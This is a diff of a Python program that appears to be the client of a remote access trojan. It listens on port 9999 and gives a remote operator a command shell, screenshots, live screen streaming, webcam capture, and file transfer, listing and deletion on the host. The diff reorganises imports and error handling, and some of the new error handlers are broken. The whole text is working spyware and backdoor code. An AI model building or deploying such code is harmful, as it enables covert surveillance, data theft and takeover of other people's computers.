@@ -1,18 +1,23 @@
-#copyright © 2019 manoharkakumani
+#copyright © 2019-2023 manoharkakumani
 import socket
 import os
 import subprocess
 import shutil
 import pickle
 import struct
+import pyautogui
+import cv2
+import numpy
+from PIL import ImageGrab
+
+port = 9999
+
 # Create a Socket
 def create_socket():
     try:
         global host
-        global port
         global s
         host = ""
-        port = 9999
         s = socket.socket()
     except socket.error as msg:
         create_socket()
@@ -27,36 +32,35 @@ def bind_socket():
         s.listen(5)
     except socket.error as msg:
            bind_socket()
+
 #shell
-def shell(data,s):
-    if data[:2]== 'cd':
-        os.chdir(data[3:])
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
+def shell(data,conn):
+    try:
+        if data[:2]== 'cd':
+            os.chdir(data[3:])
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte,"utf-8")
+            currentWD = os.getcwd() + "> "
+            conn.send(str.encode(output_str + currentWD))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
+
 #screenshot
 def sshot(conn):
     try:
-        import pyautogui
         conn.send(('OK').encode("utf-8"))
         pic = pyautogui.screenshot()
         pic.save('myssdd.png')
         fup('myssdd.png',conn)
         os.unlink('myssdd.png')
-    except:
-        conn.send(('pyautogui not install in client').encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
+
 #screen_streaming
-def stream(conn):
-    import platform
-    try:
-        import cv2,numpy
-        if platform.system()=="Windows":
-            from PIL import ImageGrab
-        else:
-            import pyscreenshot as ImageGrab
+def stream(conn): 
+    try: 
         conn.send(('OK').encode("utf-8"))
         while True:
             if conn.recv(4096).decode('utf-8')=="sst":
@@ -68,16 +72,12 @@ def stream(conn):
             else:
                 break
         return
-    except:
-        if platform.system()=="Windows":
-            conn.send(('opencv-python or PIL  or numpy not install in client').encode("utf-8"))
-        else:
-            conn.send(('opencv-python or pyscreenshot  or numpy not install in client').encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
 
 #camera
 def cam(conn):
     try:
-        import cv2
         conn.send(('OK').encode("utf-8"))
         cam = cv2.VideoCapture(0)
         if cam :
@@ -94,8 +94,8 @@ def cam(conn):
             return
         else:
             conn.send(('No camera Found').encode("utf-8"))
-    except:
-        conn.send(('opencv-python not install in client').encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
 
     
 # send file list
@@ -119,8 +119,8 @@ def cdir(conn):
            conn.send((os.getcwd()).encode("utf-8"))
         else:
             return
-    except:
-        conn.send(('Error').encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
     
 #accept file from server
     
@@ -139,27 +139,29 @@ def fdown(filename,conn):
                 totalRecv += len(data)
                 f.write(data)
             f.close()
-    except:
-        conn.send(('Error').encode("utf-8"))
-
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
 #send file
         
 def fup(filename, conn):
-    if os.path.isfile(filename):
-        conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
-        filesize=int(os.path.getsize(filename))
-        userResponse = conn.recv(1024).decode("utf-8")
-        if userResponse[:2] == 'OK':
-            with open(filename, 'rb') as f:
-                bytesToSend = f.read(1024)
-                conn.send(bytesToSend)
-                totalSend=len(bytesToSend)
-                while int (totalSend) < int(filesize):
+    try:
+        if os.path.isfile(filename):
+            conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
+            filesize=int(os.path.getsize(filename))
+            userResponse = conn.recv(1024).decode("utf-8")
+            if userResponse[:2] == 'OK':
+                with open(filename, 'rb') as f:
                     bytesToSend = f.read(1024)
-                    totalSend += len(bytesToSend)
                     conn.send(bytesToSend)
-    else:
-        conn.send("ERROR".encode("utf-8"))
+                    totalSend=len(bytesToSend)
+                    while int (totalSend) < int(filesize):
+                        bytesToSend = f.read(1024)
+                        totalSend += len(bytesToSend)
+                        conn.send(bytesToSend)
+        else:
+            conn.send("ERROR".encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
 
 # delete files
 
